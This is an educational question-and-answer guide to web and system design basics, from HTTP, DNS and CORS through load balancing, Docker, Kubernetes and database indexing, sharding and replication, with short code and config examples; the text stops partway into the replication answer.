# System Design Mastery: From Beginner to Advanced
### A Complete Q&A Guide for AI Engineers

> **How to use this guide:** Every question is followed by a detailed answer and a concrete example. Work through them in order — concepts build on each other. Return to sections as needed when you encounter them in real projects.

---

## Table of Contents

1. [Web Fundamentals](#web-fundamentals)
2. [Browser Internals & DevTools](#browser-internals--devtools)
3. [Networking Basics](#networking-basics)
4. [Server-Side Concepts](#server-side-concepts)
5. [Databases](#databases)
6. [Caching](#caching)
7. [Scalability & Load Balancing](#scalability--load-balancing)
8. [Microservices & APIs](#microservices--apis)
9. [Message Queues & Async Systems](#message-queues--async-systems)
10. [Security](#security)
11. [Advanced System Design](#advanced-system-design)

---

## Web Fundamentals

---

### Q1. What happens when you type a URL into a browser and press Enter?

**Answer:**

This is one of the most important questions in web engineering. The entire journey from typing to seeing a page involves many systems working together.

1. **DNS Resolution** — The browser checks its cache for the IP address of the domain. If not found, it asks the OS, then a DNS resolver, then root/TLD/authoritative nameservers until it gets the IP.
2. **TCP Connection** — The browser opens a TCP connection to the server IP on port 80 (HTTP) or 443 (HTTPS) using a three-way handshake (SYN → SYN-ACK → ACK).
3. **TLS Handshake** (HTTPS only) — The server sends its certificate, both sides agree on encryption keys, and a secure channel is established.
4. **HTTP Request** — The browser sends an HTTP GET request for the resource (e.g., `GET / HTTP/1.1`).
5. **Server Processing** — The server routes the request, runs business logic, queries databases if needed, and assembles a response.
6. **HTTP Response** — The server sends back an HTML document with a status code (e.g., `200 OK`).
7. **Browser Rendering** — The browser parses the HTML, discovers CSS/JS/image dependencies, fetches them, builds a DOM tree and CSSOM, runs JavaScript, and paints pixels to the screen.

**Example:**

```
You type: https://www.google.com

1. DNS: "www.google.com" → 142.250.64.100
2. TCP: Browser connects to 142.250.64.100:443
3. TLS: Certificate verified, encrypted channel opened
4. Request: GET / HTTP/1.1 Host: www.google.com
5. Server: Google's frontend servers receive and process
6. Response: 200 OK + HTML content
7. Browser: Renders the search page
```

---

### Q2. What is the difference between HTTP and HTTPS?

**Answer:**

**HTTP (HyperText Transfer Protocol)** transfers data in plain text. Anyone who can intercept the network traffic (a man-in-the-middle) can read everything — including passwords and personal data.

**HTTPS (HTTP Secure)** wraps HTTP inside **TLS (Transport Layer Security)**. This provides:
- **Encryption** — Data is unreadable to eavesdroppers.
- **Authentication** — The SSL certificate proves you're talking to the real server, not an impersonator.
- **Integrity** — Data cannot be tampered with in transit without detection.

HTTPS uses port **443** by default. HTTP uses port **80**.

**Example:**

```
HTTP Request (visible to anyone on the network):
GET /login HTTP/1.1
Host: bank.com
username=alice&password=secret123   ← EXPOSED!

HTTPS Request (encrypted in transit):
[Encrypted blob] — only bank.com's server can decrypt this
```

In Chrome's address bar, you see a lock icon 🔒 for HTTPS. A broken lock or "Not Secure" means HTTP.

---

### Q3. What are HTTP status codes and what do the major ones mean?

**Answer:**

HTTP status codes are 3-digit numbers the server sends back to tell the client what happened to its request. They're grouped into five classes:

| Range | Meaning |
|-------|---------|
| 1xx | Informational |
| 2xx | Success |
| 3xx | Redirection |
| 4xx | Client Error |
| 5xx | Server Error |

**Most important ones:**

- `200 OK` — Request succeeded, here's the response.
- `201 Created` — A resource was created (often after POST).
- `204 No Content` — Success but nothing to return (often after DELETE).
- `301 Moved Permanently` — The URL has permanently changed. Browsers cache this.
- `302 Found` — Temporary redirect.
- `304 Not Modified` — Resource hasn't changed since last request; use cached version.
- `400 Bad Request` — Client sent invalid/malformed data.
- `401 Unauthorized` — Not logged in.
- `403 Forbidden` — Logged in but not allowed to access this.
- `404 Not Found` — Resource doesn't exist.
- `429 Too Many Requests` — Rate limiting kicked in.
- `500 Internal Server Error` — Something crashed on the server.
- `502 Bad Gateway` — A proxy got a bad response from an upstream server.
- `503 Service Unavailable` — Server is overloaded or down for maintenance.

**Example:**

```
POST /api/users  { "email": "alice@example.com" }
→ 201 Created   { "id": 42, "email": "alice@example.com" }

GET /api/users/999
→ 404 Not Found  { "error": "User not found" }

GET /api/secret-data  (without auth token)
→ 401 Unauthorized  { "error": "Please log in" }
```

---

### Q4. What is the difference between GET, POST, PUT, PATCH, and DELETE?

**Answer:**

These are **HTTP methods** (also called verbs) that describe what action the client wants to perform:

| Method | Purpose | Has Body? | Idempotent? |
|--------|---------|-----------|-------------|
| GET | Retrieve a resource | No | Yes |
| POST | Create a new resource | Yes | No |
| PUT | Replace a resource entirely | Yes | Yes |
| PATCH | Partially update a resource | Yes | No |
| DELETE | Remove a resource | No | Yes |

**Idempotent** means calling it multiple times has the same effect as calling it once.

**Example:**

```
GET    /api/users/1          → Returns user with id=1
POST   /api/users            → Creates a new user
PUT    /api/users/1          → Replaces the entire user record
PATCH  /api/users/1          → Updates only the fields you send
DELETE /api/users/1          → Deletes user with id=1

POST /api/users  ← NOT idempotent:
  Call 1: Creates user Alice (id=1)
  Call 2: Creates another user Alice (id=2) ← different outcome!

DELETE /api/users/1  ← Idempotent:
  Call 1: Deletes user 1
  Call 2: User 1 is still gone. Same result.
```

---

### Q5. What is a REST API?

**Answer:**

**REST (Representational State Transfer)** is an architectural style for designing networked APIs. It's not a protocol — it's a set of constraints. A REST API that follows all constraints is called **RESTful**.

The key constraints are:

1. **Stateless** — Each request contains all information the server needs. The server stores no session state between requests.
2. **Client-Server** — Separation of concerns: the client handles UI, the server handles data.
3. **Uniform Interface** — Resources are identified by URLs. HTTP methods are used consistently.
4. **Layered System** — The client doesn't need to know if it's talking directly to the server or through proxies/load balancers.
5. **Cacheable** — Responses should indicate whether they can be cached.

**Example:**

```
REST API for a blog:

GET    /posts          → List all posts
GET    /posts/5        → Get post #5
POST   /posts          → Create a new post
PUT    /posts/5        → Update post #5 entirely
PATCH  /posts/5        → Update part of post #5
DELETE /posts/5        → Delete post #5
GET    /posts/5/comments   → Get comments for post #5
POST   /posts/5/comments   → Add a comment to post #5
```

The URL represents a **resource** (a thing), not an action. Bad REST design would be: `POST /createPost` or `GET /deletePost?id=5`.

---

### Q6. What is the difference between cookies, localStorage, and sessionStorage?

**Answer:**

These are three ways browsers store data on the client side, and they differ in scope, lifetime, and behavior.

| Feature | Cookies | localStorage | sessionStorage |
|---------|---------|-------------|----------------|
| Capacity | ~4KB | ~5-10MB | ~5-10MB |
| Sent with requests? | Yes (automatically) | No | No |
| Lifetime | Set by server | Until manually cleared | Until tab is closed |
| Accessible by JS? | Yes (unless HttpOnly) | Yes | Yes |
| Per domain? | Yes | Yes | Yes (per tab) |

**When to use each:**

- **Cookies** — Authentication tokens, session IDs (anything that needs to be automatically sent to the server). Cookies can be marked `HttpOnly` (JS can't read them) and `Secure` (only sent over HTTPS).
- **localStorage** — Persisting user preferences (dark mode, language) across sessions.
- **sessionStorage** — Temporary data that should disappear when the tab closes (multi-step form state).

**Example:**

```javascript
// Cookie (usually set by server, but also writable by JS)
document.cookie = "theme=dark; expires=Fri, 31 Dec 2026 23:59:59 GMT; path=/";

// localStorage — persists even after closing browser
localStorage.setItem("language", "en");
const lang = localStorage.getItem("language"); // "en"

// sessionStorage — gone when tab closes
sessionStorage.setItem("step", "2");
const step = sessionStorage.getItem("step"); // "2"
```

---

## Browser Internals & DevTools

---

### Q7. What is the DOM?

**Answer:**

**DOM (Document Object Model)** is a programming interface that the browser creates when it parses HTML. It represents the page as a **tree of objects** (nodes), where each HTML element becomes a node you can interact with using JavaScript.

The DOM is NOT the same as your HTML source file. It's a live, in-memory representation that JavaScript can read and modify. When you change the DOM, the browser re-renders the affected parts of the page.

**Example:**

```html
<!-- HTML source -->
<html>
  <body>
    <h1 id="title">Hello</h1>
    <p>World</p>
  </body>
</html>
```

```
DOM Tree:
Document
└── html
    └── body
        ├── h1 (id="title")  → text: "Hello"
        └── p                → text: "World"
```

```javascript
// Modifying the DOM with JavaScript
const title = document.getElementById("title");
title.textContent = "Hi there!"; // Page now shows "Hi there!" without reloading
title.style.color = "red";
```

---

### Q8. How do you use the browser's Inspect Element tool?

**Answer:**

The browser's **DevTools** (opened with `F12` or right-click → Inspect) is an essential debugging toolkit. The **Elements tab** shows you the live DOM tree.

**Key things you can do:**

- **Inspect any element** — Right-click any element on a page, click "Inspect" to jump to it in the DOM tree.
- **Edit HTML live** — Double-click any element or attribute to edit it. Changes are instant but disappear on reload.
- **Edit CSS live** — The right panel (Styles) shows CSS rules applying to the selected element. You can toggle properties on/off or change values.
- **Find hidden elements** — Elements with `display: none` are visible in DevTools even though they're hidden on the page.
- **Copy the selector** — Right-click an element in DevTools → Copy → Copy selector, to get a CSS selector for that element.

**Example: Debugging a button's style**

```
1. Open DevTools (F12)
2. Click the cursor icon (top-left of DevTools) → hover over a button on the page
3. The Elements panel highlights the button's HTML
4. In the Styles panel, you see:  
     .btn { background: blue; padding: 10px; }
5. Click the color "blue" → a color picker appears, change it to red
6. The button changes to red instantly (just for testing — not saved)
```

---

### Q9. What is the Network Tab in DevTools and how do you use it?

**Answer:**

The **Network tab** shows every HTTP request your browser makes — HTML, CSS, JavaScript, images, API calls, fonts. It's the most powerful tab for debugging performance and API issues.

**Key columns:**
- **Name** — The URL of the request.
- **Status** — HTTP status code (200, 404, 500, etc.).
- **Type** — Resource type (document, script, xhr, fetch, img, etc.).
- **Size** — How many bytes were transferred.
- **Time** — How long the request took.
- **Waterfall** — Visual timeline showing when the request started and finished.

**Common use cases:**

1. **Debugging a failed API call** — Filter by "XHR" or "Fetch", find the failing request, click it → see Request (what you sent) and Response (what came back).
2. **Checking what data an API returns** — Click any API request → Response tab.
3. **Performance analysis** — See which requests are slowest, which are blocking page load.
4. **Checking headers** — See request and response headers (authentication tokens, content-type, CORS headers, etc.).

**Example:**

```
Scenario: Your React app shows "Error loading data"

1. Open DevTools → Network tab
2. Reload the page
3. Filter by "Fetch/XHR"
4. Find the red (failed) request: POST /api/data
5. Click it → Preview tab shows: { "error": "Unauthorized" }
6. Headers tab shows: status 401
7. Diagnosis: Your auth token is missing or expired
```

---

### Q10. What is the Console tab used for?

**Answer:**

The **Console** is a JavaScript execution environment and log viewer built into DevTools. It shows:

- **Errors** — Red entries with a stack trace telling you what broke and where.
- **Warnings** — Yellow entries for non-fatal issues.
- **Logs** — Output from `console.log()` in your code.
- **User-typed JavaScript** — You can type any JavaScript and run it against the current page.

**Useful console methods:**

```javascript
console.log("Basic output", variable);
console.error("Something broke:", error);
console.warn("Deprecated API used");
console.table([{ name: "Alice", age: 30 }, { name: "Bob", age: 25 }]); // Pretty table
console.time("myTimer");  // Start timing
doSomethingExpensive();
console.timeEnd("myTimer"); // Prints how long it took
console.group("Group name"); // Collapsible group of logs
console.groupEnd();
```

**Example:**

```javascript
// In your code:
console.log("User data:", userData);
// Console shows: User data: { id: 1, name: "Alice", email: "alice@ex.com" }

// In the console tab, you can type:
document.title = "Hacked!"  // Changes browser tab title
document.body.style.background = "pink"  // Changes background
fetch('/api/users').then(r => r.json()).then(console.log) // Calls your own API
```

---

### Q11. What is the difference between client-side rendering (CSR) and server-side rendering (SSR)?

**Answer:**

This is a fundamental architectural decision that affects performance, SEO, and user experience.

**Client-Side Rendering (CSR):**
- The server sends a near-empty HTML file and a large JavaScript bundle.
- The browser downloads the JS, runs it, and the JS builds the HTML.
- First page load is slow (blank screen while JS downloads/runs). Subsequent navigation is fast (no full page reload).
- Bad for SEO because crawlers may not execute JS.
- Example: Traditional React/Vue/Angular SPAs.

**Server-Side Rendering (SSR):**
- The server runs the application code, builds the full HTML, and sends complete HTML to the browser.
- Browser receives ready-to-display content immediately (fast First Contentful Paint).
- Great for SEO.
- Every page navigation requires a round trip to the server.
- Example: Next.js with `getServerSideProps`, traditional PHP/Ruby on Rails.

**Example:**

```
CSR Timeline:
1. Browser requests /dashboard
2. Server sends: <html><body><div id="root"></div><script src="app.js"></script></body></html>
3. Browser downloads app.js (maybe 500KB, takes 2 seconds)
4. app.js runs, fetches data from API, renders UI
5. User sees content after 3-4 seconds
   → Blank screen for 3-4 seconds!

SSR Timeline:
1. Browser requests /dashboard
2. Server fetches data from database, renders full HTML
3. Server sends: <html>...<h1>Welcome, Alice</h1>...<table>...data...</table>...</html>
4. Browser receives and displays immediately
   → User sees content in 0.5 seconds!
```

---

### Q12. What is Static Site Generation (SSG)?

**Answer:**

**SSG** is a rendering strategy where HTML pages are generated **at build time** (when you deploy your app), not at request time. The generated static files are served from a CDN.

**Trade-offs:**
- ✅ Extremely fast — serving pre-built files from a CDN is near-instant.
- ✅ Great for SEO.
- ✅ No server needed at runtime (cheap to host).
- ❌ Content is stale until you rebuild and redeploy.
- ❌ Not suitable for highly dynamic, personalized content.

Best for: Marketing sites, blogs, documentation.

**Example:**

```
A blog with 500 posts:

SSG approach (Next.js):
- At build time, Next.js reads all 500 markdown files
- Generates 500 static HTML files
- Deploys them to Vercel/Netlify CDN
- A visitor to /blog/post-1 gets a pre-built HTML file served from a server near them
- Page load: ~50ms

SSR approach:
- Same visitor hits /blog/post-1
- Server fetches post from database, renders HTML, sends it
- Page load: ~200-400ms
- Server is involved in every single request
```

---

## Networking Basics

---

### Q13. What is DNS and how does it work?

**Answer:**

**DNS (Domain Name System)** is the internet's phone book. It translates human-readable domain names (`google.com`) into IP addresses (`142.250.64.100`) that computers use to route traffic.

**DNS resolution process:**

1. **Browser cache** — Did I look this up recently?
2. **OS cache** — Has the operating system seen this before?
3. **Recursive Resolver** — Your ISP or Google's 8.8.8.8. It does the heavy lifting.
4. **Root Nameservers** — Knows where `.com`, `.org`, `.io` etc. servers are.
5. **TLD Nameserver** — Knows which server handles `google.com`.
6. **Authoritative Nameserver** — Has the actual IP for `www.google.com`.

The result is cached at each level with a TTL (Time to Live) to avoid repeating the lookup.

**Example:**

```
Lookup: www.github.com

Recursive Resolver → Root NS: "Who handles .com?"
Root NS → Resolver: "Try a.gtld-servers.net"
Resolver → TLD NS: "Who handles github.com?"
TLD NS → Resolver: "Try ns-1283.awsdns-32.org"
Resolver → Authoritative NS: "What's the IP for www.github.com?"
Auth NS → Resolver: "140.82.113.4"
Resolver → Browser: "140.82.113.4" (and cache it for 60 seconds)
```

---

### Q14. What is the difference between TCP and UDP?

**Answer:**

TCP and UDP are transport layer protocols — they define how data is sent between computers.

**TCP (Transmission Control Protocol):**
- **Reliable** — Guarantees delivery. If a packet is lost, it's retransmitted.
- **Ordered** — Packets arrive in the correct order.
- **Connection-oriented** — Requires a handshake before sending data.
- **Slower** — The overhead of reliability adds latency.
- **Use cases:** Web (HTTP/HTTPS), Email, File transfers, SSH.

**UDP (User Datagram Protocol):**
- **Unreliable** — Fire and forget. Packets may be lost or arrive out of order.
- **Connectionless** — No handshake.
- **Fast** — Low overhead, minimal latency.
- **Use cases:** Video streaming, online gaming, DNS, VoIP.

**Example:**

```
TCP — Downloading a file:
- Every single byte must arrive correctly.
- If packet #47 is lost, TCP waits and retransmits it.
- Order matters: you can't reassemble a ZIP file with missing/out-of-order bytes.

UDP — Video call (Zoom, Google Meet):
- A dropped video frame is acceptable; you don't want to pause the call to retransmit it.
- It's more important to have low latency than perfect data.
- Better to show a blurry frame than to freeze the video while retransmitting.
```

---

### Q15. What is a CDN (Content Delivery Network)?

**Answer:**

A **CDN** is a geographically distributed network of servers (called **edge nodes** or **PoPs — Points of Presence**) that cache and serve content from locations close to users.

**Without CDN:** Every user's request goes to your origin server, regardless of where they are. A user in Bangladesh requesting a US-hosted site experiences high latency.

**With CDN:** The user's request goes to the nearest edge node. If the content is cached there, it's served instantly. If not, the edge node fetches it from the origin, caches it, and serves it.

**What CDNs are used for:**
- Static assets (images, CSS, JS files).
- Video streaming.
- API acceleration (some CDNs like Cloudflare can cache API responses).
- DDoS protection (CDN absorbs attack traffic before it reaches your server).

**Example:**

```
User in Dhaka, Bangladesh accesses a US-based image hosting site.

Without CDN:
- Request travels: Dhaka → transatlantic cable → US server → back to Dhaka
- Round trip: ~300-400ms

With CDN (e.g., Cloudflare, AWS CloudFront):
- Request travels: Dhaka → CDN edge node in Mumbai (200km away)
- If cached: served from Mumbai in ~20ms
- If not cached: Mumbai edge fetches from US, caches it, serves it
- Subsequent requests from all of South Asia: served from Mumbai at ~20ms
```

---

### Q16. What is a WebSocket and when would you use it?

**Answer:**

**WebSocket** is a communication protocol that provides a **persistent, full-duplex** (bidirectional) connection between a client and server over a single TCP connection.

In regular HTTP, the client always initiates: client sends request → server responds → connection closes (or is reused for next request). The server cannot push data to the client without being asked.

WebSocket changes this: after an initial HTTP handshake that "upgrades" to WebSocket, either side can send messages at any time.

**Use cases:**
- Real-time chat applications.
- Live notifications.
- Collaborative editing (Google Docs-style).
- Live dashboards (stock prices, sports scores).
- Multiplayer online games.

**Example:**

```javascript
// Client side
const ws = new WebSocket("wss://chat.example.com/ws");

ws.onopen = () => {
  console.log("Connected!");
  ws.send(JSON.stringify({ type: "join", room: "general" }));
};

ws.onmessage = (event) => {
  const message = JSON.parse(event.data);
  console.log("New message:", message);
  displayMessage(message); // Update UI
};

ws.onerror = (error) => console.error("WebSocket error:", error);

// Server pushes a message to client at any time (no request needed):
// ws.send(JSON.stringify({ user: "Bob", text: "Hello!", timestamp: ... }))
```

---

### Q17. What is CORS and why does it exist?

**Answer:**

**CORS (Cross-Origin Resource Sharing)** is a browser security mechanism that restricts web pages from making requests to a different domain than the one that served the page.

**Origin** = scheme + domain + port. `https://app.com` and `https://api.app.com` are different origins.

**Why it exists:** Browsers implement the **Same-Origin Policy (SOP)** to prevent malicious websites from making requests on your behalf. If you're logged into your bank at `bank.com` and visit `evil.com`, without SOP, evil.com's JavaScript could make requests to bank.com using your cookies.

**How CORS works:** The server adds response headers to say "I allow requests from these origins." If the server doesn't include the right headers, the browser blocks the response.

**Example:**

```javascript
// Your frontend at https://myapp.com makes this fetch:
fetch("https://api.myapp.com/data")
  .then(r => r.json())
  .then(console.log);

// Browser blocks this if api.myapp.com doesn't respond with:
// Access-Control-Allow-Origin: https://myapp.com
// or: Access-Control-Allow-Origin: *

// Server-side fix (Node.js/Express):
app.use(cors({
  origin: "https://myapp.com",   // Allow only your frontend
  methods: ["GET", "POST"],
  allowedHeaders: ["Content-Type", "Authorization"],
}));
```

The error you'll see in the console: `Access to fetch at 'https://api.myapp.com/data' from origin 'https://myapp.com' has been blocked by CORS policy`

This is a **browser** restriction — CORS does not affect server-to-server requests.

---

### Q18. What is a proxy and a reverse proxy?

**Answer:**

**Forward Proxy (Proxy):** Sits between clients and the internet, acting on behalf of the client. The server doesn't know the real client's identity.
- Use cases: Bypassing geo-restrictions, corporate firewalls, anonymizing traffic.

**Reverse Proxy:** Sits in front of one or more servers, acting on behalf of the server. The client doesn't know which real server it's talking to.
- Use cases: Load balancing, SSL termination, caching, security filtering, A/B testing.

**Example:**

```
Forward Proxy:
Client → [Proxy Server] → Google.com
Google.com sees the proxy's IP, not the client's IP.
Used by: VPNs, corporate networks.

Reverse Proxy:
         [Reverse Proxy / nginx]
Client →  ├── Server A (handles 33% of traffic)
          ├── Server B (handles 33% of traffic)
          └── Server C (handles 33% of traffic)

The client talks to one address. The proxy distributes traffic.
Used by: Nginx, AWS ALB, Cloudflare.

Real example — nginx reverse proxy config:
server {
  listen 80;
  server_name myapp.com;
  
  location /api/ {
    proxy_pass http://api-server:3000;
  }
  
  location / {
    proxy_pass http://frontend-server:3001;
  }
}
```

---

## Server-Side Concepts

---

### Q19. What is the difference between monolithic and microservices architectures?

**Answer:**

**Monolithic Architecture:** The entire application (frontend, backend, database logic, business rules) is built and deployed as a single unit.
- Simple to develop initially.
- One codebase, one deployment.
- Hard to scale individual components.
- A bug in one module can crash the whole app.

**Microservices Architecture:** The application is split into small, independent services, each responsible for a specific business function. Each service has its own codebase and database and communicates with others via APIs.
- Independent deployment and scaling.
- Technology flexibility (each service can use different languages/databases).
- More operational complexity (networking, service discovery, distributed tracing).

**Example:**

```
E-commerce app — Monolithic:
[ Single application ]
├── User authentication
├── Product catalog
├── Cart & checkout
├── Payment processing
├── Order management
├── Email notifications
└── All sharing one PostgreSQL database

E-commerce app — Microservices:
[User Service]     ← its own database
[Product Service]  ← its own database  
[Cart Service]     ← Redis cache
[Payment Service]  ← its own database
[Order Service]    ← its own database
[Email Service]    ← message queue consumer

Each runs independently. A crash in Email Service
doesn't affect the ability to checkout.
```

---

### Q20. What is a load balancer?

**Answer:**

A **load balancer** distributes incoming network traffic across multiple servers to prevent any single server from being overwhelmed, improving availability and response time.

**Load balancing algorithms:**
- **Round Robin** — Requests go to each server in turn (A, B, C, A, B, C…).
- **Least Connections** — New request goes to the server with fewest active connections.
- **IP Hashing** — Same client IP always goes to the same server (useful for stateful sessions).
- **Weighted** — Servers with more capacity receive more traffic.

**Layer 4 vs Layer 7:**
- **L4 (Transport Layer)** — Routes based on IP and port. Faster, no inspection of content.
- **L7 (Application Layer)** — Routes based on HTTP headers, cookies, URLs. Can do `/api/*` → API server, `/static/*` → file server.

**Example:**

```
Setup: 3 backend servers behind a load balancer

Round Robin:
Request 1  → Server A
Request 2  → Server B
Request 3  → Server C
Request 4  → Server A  ← cycle repeats
Request 5  → Server B

Health checks: The load balancer pings each server every 5 seconds.
If Server B stops responding, it's removed from rotation.
Requests 2, 5 now go to A and C instead.
Users see no interruption.
```

---

### Q21. What is horizontal vs vertical scaling?

**Answer:**

When your application needs to handle more traffic, you have two strategies:

**Vertical Scaling (Scale Up):** Make your existing server more powerful — add more CPU, RAM, or faster storage.
- Simple (no code changes needed).
- Has a hard limit (you can't add infinite RAM to one machine).
- If the server goes down, everything goes down (single point of failure).

**Horizontal Scaling (Scale Out):** Add more servers and distribute the load.
- Virtually unlimited scalability.
- Requires a load balancer.
- Requires stateless application design (can't store session data on one server).
- More complex to manage.

**Example:**

```
Vertical Scaling:
Your server: 4 CPU cores, 8GB RAM, handles 1,000 req/sec
→ Upgrade to: 16 CPU cores, 64GB RAM
→ Now handles 4,000 req/sec
But: At 96 cores/512GB RAM, you've hit hardware limits.
Cost: One $10,000/mo server.

Horizontal Scaling:
Start with: 1 server, 1,000 req/sec
Add server: 2 servers, 2,000 req/sec
Add more: 10 servers, 10,000 req/sec
Add more: 100 servers, 100,000 req/sec
No hard limit. Elastic (add/remove based on demand).
Cost: 10 × $200/mo servers = $2,000/mo (much cheaper at scale).
```

---

### Q22. What is a message queue, and why is it used?

**Answer:**

A **message queue** is a communication mechanism where producers write messages to a queue, and consumers read and process them asynchronously. The producer doesn't wait for the consumer to finish processing.

**Why use it:**
1. **Decoupling** — Producer and consumer don't need to be online at the same time.
2. **Load leveling** — If consumers are slow, messages queue up instead of crashing the system.
3. **Reliability** — If a consumer crashes, the message stays in the queue for retry.
4. **Async processing** — Long tasks (sending emails, resizing images) happen in the background without blocking the user.

**Popular tools:** RabbitMQ, Apache Kafka, AWS SQS, Redis Pub/Sub.

**Example:**

```
User uploads a video:

Without queue (synchronous):
User → POST /upload → Server processes video (5 minutes) → Response
User waits 5 minutes staring at a spinner. Bad UX.

With queue (asynchronous):
User → POST /upload → Server saves raw file → Puts job in queue → "Upload received!" (response in 100ms)
Background worker pulls job from queue → Transcodes video → Notifies user when done

Queue contents during processing:
[ { jobId: "abc", userId: 42, file: "video.mp4", status: "pending" } ]

Worker picks it up → processes → marks complete.
```

---

### Q23. What is Docker and why is it used?

**Answer:**

**Docker** is a platform for packaging applications and their dependencies into **containers**. A container is a lightweight, standalone, executable package that includes everything needed to run a piece of software: code, runtime, system tools, libraries, and settings.

**Problem Docker solves:** "It works on my machine!" When developers work in different environments than production, inconsistencies cause bugs that are hard to reproduce.

**Container vs Virtual Machine:**
- **VM** — Emulates an entire computer, including its own OS kernel. Heavy (GBs of disk, minutes to start).
- **Container** — Shares the host OS kernel. Lightweight (MBs of disk, seconds to start).

**Example:**

```dockerfile
# Dockerfile — recipe for building your container image
FROM node:20-alpine           # Start from official Node.js image

WORKDIR /app                  # Set working directory

COPY package*.json ./         # Copy dependency list
RUN npm install               # Install dependencies

COPY . .                      # Copy source code

EXPOSE 3000                   # Document which port this listens on

CMD ["node", "server.js"]     # Command to run when container starts
```

```bash
# Build the image
docker build -t my-api:1.0 .

# Run the container
docker run -p 3000:3000 my-api:1.0

# This exact container runs identically on:
# - Your laptop
# - A teammate's Windows machine
# - AWS production servers
```

---

### Q24. What is Kubernetes (K8s)?

**Answer:**

**Kubernetes** is a container orchestration platform — it automates the deployment, scaling, and management of containerized applications across a cluster of machines.

If Docker is like "packaging your app into a shipping container," Kubernetes is like "managing a fleet of cargo ships and automatically routing containers to the right ship."

**Key concepts:**
- **Pod** — The smallest deployable unit; one or more containers that run together.
- **Deployment** — Declares how many replicas of a pod to run. Handles rolling updates.
- **Service** — A stable network endpoint to reach a set of pods (pods come and go; service IPs are stable).
- **Ingress** — Routes external HTTP traffic to the right service.
- **Node** — A machine (VM or physical) in the cluster.

**Example:**

```yaml
# Deployment: "Run 3 copies of my API container"
apiVersion: apps/v1
kind: Deployment
metadata:
  name: api-deployment
spec:
  replicas: 3            # Keep 3 pods running at all times
  selector:
    matchLabels:
      app: my-api
  template:
    spec:
      containers:
      - name: api
        image: my-api:1.0
        ports:
        - containerPort: 3000

# If one pod crashes, Kubernetes restarts it automatically.
# kubectl scale deployment api-deployment --replicas=10
# → Kubernetes spins up 7 more pods within seconds.
```

---

## Databases

---

### Q25. What is the difference between SQL and NoSQL databases?

**Answer:**

**SQL (Relational) Databases:**
- Store data in structured **tables** with predefined schemas.
- Rows and columns. Relationships via foreign keys.
- Use SQL query language.
- Strong consistency and ACID transactions.
- Best for: structured data with complex relationships, financial systems.
- Examples: PostgreSQL, MySQL, SQLite.

**NoSQL Databases:**
- Store data in flexible formats: documents, key-value pairs, graphs, columns.
- No fixed schema — fields can vary per record.
- Optimized for horizontal scaling and high throughput.
- Eventually consistent (usually).
- Best for: unstructured/semi-structured data, massive scale.
- Examples: MongoDB (documents), Redis (key-value), Cassandra (wide-column), Neo4j (graph).

**Example:**

```sql
-- SQL (PostgreSQL): User with orders
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  name VARCHAR(100),
  email VARCHAR(100) UNIQUE
);

CREATE TABLE orders (
  id SERIAL PRIMARY KEY,
  user_id INTEGER REFERENCES users(id),
  total DECIMAL(10,2)
);

SELECT u.name, o.total 
FROM users u JOIN orders o ON u.id = o.user_id
WHERE u.id = 42;
```

```javascript
// NoSQL (MongoDB): User with embedded orders
{
  "_id": "507f1f77bcf86cd799439011",
  "name": "Alice",
  "email": "alice@example.com",
  "orders": [
    { "total": 29.99, "date": "2026-01-01" },
    { "total": 59.99, "date": "2026-02-15" }
  ]
}
// No joins needed — all data in one document
```

---

### Q26. What is an index in a database?

**Answer:**

A **database index** is a data structure (usually a B-tree) that the database maintains separately from the table to speed up lookups. It's like the index in a book — instead of scanning every page to find "load balancer," you go to the index, find "load balancer → page 47", and jump there directly.

**Without an index:** Database does a **full table scan** — reads every row to find matches. O(n) time.

**With an index:** Database does a fast lookup. O(log n) time.

**Trade-offs:**
- ✅ Dramatically faster reads.
- ❌ Slower writes (inserts/updates must update the index too).
- ❌ More disk space.

**Example:**

```sql
-- Table with 10 million users
SELECT * FROM users WHERE email = 'alice@example.com';

-- Without index:
-- DB scans all 10,000,000 rows → takes ~5 seconds

-- Create an index:
CREATE INDEX idx_users_email ON users(email);

-- With index:
-- DB jumps directly to 'alice@example.com' → takes ~1ms

-- Composite index (for queries filtering by multiple columns):
CREATE INDEX idx_orders_user_status ON orders(user_id, status);
-- Speeds up: WHERE user_id = 42 AND status = 'pending'
```

---

### Q27. What are ACID properties in databases?

**Answer:**

**ACID** is a set of properties that guarantee database transactions are processed reliably, even in cases of errors, power failures, or concurrent access.

- **Atomicity** — A transaction is all-or-nothing. If any step fails, the entire transaction is rolled back. No partial updates.
- **Consistency** — A transaction brings the database from one valid state to another. Rules (constraints, foreign keys) are never violated.
- **Isolation** — Concurrent transactions don't see each other's intermediate states. They appear to run sequentially.
- **Durability** — Once a transaction commits, it's permanently saved, even if the system crashes.

**Example:**

```sql
-- Bank transfer: Alice sends $100 to Bob
BEGIN TRANSACTION;

UPDATE accounts SET balance = balance - 100 WHERE id = 'alice';  -- Step 1
UPDATE accounts SET balance = balance + 100 WHERE id = 'bob';    -- Step 2

COMMIT;

-- Atomicity: If Step 2 fails (Bob's account doesn't exist),
-- Step 1 is also rolled back. Alice's money is not lost.

-- Without atomicity: Step 1 succeeds, Step 2 fails → $100 disappears!

-- Isolation: If another transaction reads Alice's balance between Step 1 and Step 2,
-- it won't see the -$100 temporary state.
```

---

### Q28. What is database sharding?

**Answer:**

**Sharding** is a horizontal partitioning strategy where a large database is split into smaller pieces called **shards**, each stored on a different server. Each shard contains a subset of the data.

**Why shard:** A single database server has limits (disk space, CPU, RAM). When your data grows to terabytes or you need millions of queries per second, one server isn't enough.

**Sharding strategies:**
- **Range-based** — User IDs 1–1M on shard 1, 1M–2M on shard 2, etc.
- **Hash-based** — `hash(user_id) % num_shards` determines which shard.
- **Directory-based** — A lookup table maps each key to its shard.

**Challenges:** Cross-shard joins are complex. Re-sharding when you add servers is hard. Transactions across shards are difficult.

**Example:**

```
Users table with 1 billion rows → too big for one server

Shard by user_id using hash:
hash(user_id) % 4

user_id=100: hash → shard 0 (Server A)
user_id=101: hash → shard 1 (Server B)
user_id=102: hash → shard 2 (Server C)
user_id=103: hash → shard 3 (Server D)
user_id=104: hash → shard 0 (Server A) again

Query: SELECT * FROM users WHERE user_id = 101
  → Calculate: shard 1
  → Query only Server B
  → 4x faster than querying all data
```

---

### Q29. What is database replication?

**Answer:**

**Replication** is the process of copying data from one database server (the **primary/master**) to one or more other servers (**replicas/slaves**). Replicas always reflect the latest state of the primary.

**Types:**
- **Synchronous** — Primary waits for replica to confirm write before returning success. Strong consistency, slower.
- **Asynchronous** — Primary returns success immediately; replica updates shortly after. Faster, risk of slight data loss if primary crashes before replica syncs.

